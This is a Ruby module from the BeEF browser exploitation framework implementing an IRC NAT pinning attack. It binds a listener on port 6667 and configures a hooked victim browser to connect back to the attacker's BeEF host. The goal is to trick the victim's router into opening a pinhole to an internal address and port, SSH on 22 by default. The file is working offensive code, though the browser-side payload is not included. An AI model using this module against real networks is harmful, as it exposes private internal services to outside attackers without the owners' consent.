#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Irc_nat_pinning < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_socket("IRC", "0.0.0.0", 6667)
  end

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")

    return [
        {'name'=>'connectto', 'ui_label' =>'Connect to','value'=>beef_host},
        {'name'=>'privateip', 'ui_label' =>'Private IP','value'=>'192.168.0.100'},
        {'name'=>'privateport', 'ui_label' =>'Private Port','value'=>'22'}
    ]
  end
  
  def post_execute
    return if @datastore['result'].nil?
    save({'result' => @datastore['result']})

    # wait 30 seconds before unbinding the socket. The HTTP connection will arrive sooner than that anyway.
    sleep 30
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket("IRC")

  end
  
end
